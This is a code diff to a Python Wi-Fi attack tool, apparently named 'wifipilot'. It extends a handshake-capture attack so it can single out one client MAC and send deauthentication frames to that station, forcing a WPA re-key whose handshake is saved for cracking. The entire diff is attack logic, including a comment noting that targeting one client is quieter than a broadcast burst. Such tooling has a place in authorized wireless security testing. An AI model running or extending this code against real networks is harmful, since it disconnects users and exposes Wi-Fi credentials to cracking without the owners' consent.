@@ -4,15 +4,11 @@ from __future__ import annotations
 
 import contextlib
 import os
-import re
 import time
-from pathlib import Path
-from typing import Optional
 
 from ..deps import registry
-from ..events import EK
-from ..models import STATUS_FAILED, STATUS_SUCCESS, AccessPoint, Attempt, Capture
-from ..util import C, Process, human_duration
+from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Capture
+from ..util import Process, human_duration, mac_norm
 from .base import Attack, AttackContext, AttackOutcome
 
 
@@ -38,12 +34,19 @@ class HandshakeAttack(Attack):
         if ap.encryption == "WPA3" or (ap.sae and not ap.sai):
             return self._fail(ctx, attempt, "WPA3-SAE target",
                               "deauthentication cannot yield a crackable handshake against SAE")
+        target_client = mac_norm(getattr(ctx.config, "client_mac", "") or "")
+        if target_client and target_client not in ap.clients:
+            return self._fail(ctx, attempt, f"{target_client} is not a client of "
+                              f"{ap.display_name}",
+                              "the named station is not associated with this AP; run a "
+                              "scan (or use `wifipilot tracker` to follow it)")
         if ctx.demo:
-            return self._run_demo(ctx, ap, attempt)
-        return self._run_live(ctx, ap, attempt)
+            return self._run_demo(ctx, ap, attempt, target_client)
+        return self._run_live(ctx, ap, attempt, target_client)
 
     # ---------------------------------------------------------------- #
-    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
+    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
+                  client: str = "") -> AttackOutcome:
         timeout = ctx.config.attack_timeout_for(self.name)
         deadline = time.time() + min(timeout, 45)
         tries = 0
@@ -51,8 +54,9 @@ class HandshakeAttack(Attack):
             tries += 1
             ctx.progress(f"deauth + capture on {ap.display_name}", kind="capture",
                          bssid=ap.bssid, percent=min(95, tries * 18),
-                         detail=f"attempt {tries}, {len(ap.clients)} client(s) in range")
-            ctx.deauth(ap)
+                         detail=(f"attempt {tries}, deauthing {client}" if client else
+                                 f"attempt {tries}, {len(ap.clients)} client(s) in range"))
+            ctx.deauth(ap, client=client)
             if ctx.radio.handshake_ok(ap.bssid, tries):
                 # a genuinely valid capture, so validation and cracking are real
                 path = ctx.artifact_path("handshakes", ap, ".cap")
@@ -77,7 +81,8 @@ class HandshakeAttack(Attack):
                           f"{ap.deauths_sent} deauth frames sent, no M1/M2 seen")
 
     # ---------------------------------------------------------------- #
-    def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
+    def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
+                  client: str = "") -> AttackOutcome:
         timeout = ctx.config.attack_timeout_for(self.name)
         prefix = ctx.artifact_path("handshakes", ap, "")
         cap_path = prefix + "-01.cap"
@@ -130,7 +135,9 @@ class HandshakeAttack(Attack):
                 # deauth in bursts to force a re-key
                 if not ctx.want_stop() and time.time() - last_burst >= ctx.config.deauth_interval:
                     last_burst = time.time()
-                    deauth_done += ctx.deauth(ap)
+                    # a named station is deauthenticated on its own: one client's
+                    # reconnect is a smaller, quieter ask than a broadcast burst
+                    deauth_done += ctx.deauth(ap, client=client)
                 time.sleep(1.0)
         finally:
             with contextlib.suppress(Exception):
